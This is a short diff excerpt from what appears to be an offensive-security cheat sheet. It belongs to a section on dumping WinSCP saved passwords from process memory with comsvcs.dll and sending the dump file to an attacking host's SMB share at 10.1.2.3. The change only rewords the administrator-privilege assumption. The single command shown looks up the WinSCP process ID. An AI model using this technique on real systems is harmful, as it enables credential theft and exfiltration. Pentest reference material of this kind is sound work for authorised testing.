@@ -1342,7 +1342,7 @@ sc config ImapiService binPath= "C:\WINDOWS\system32\imapi.exe" start= disabled
 ## >> Dumping WinSCP passwords from memory using comsvcs.dll
 
 Assumes attacking host 10.1.2.3 has an anonymous writable SMB share to receive the dmp file.<br />
-Assumes a command prompt with administrator privileges is in use.<br />
+Assumes a command prompt with administrator privileges has been acquired on the target.<br />
 ```
 wmic process where name^="winscp.exe" get Processid | findstr /r /c:"[0-9]" > %TEMP%\winscp.pid
 
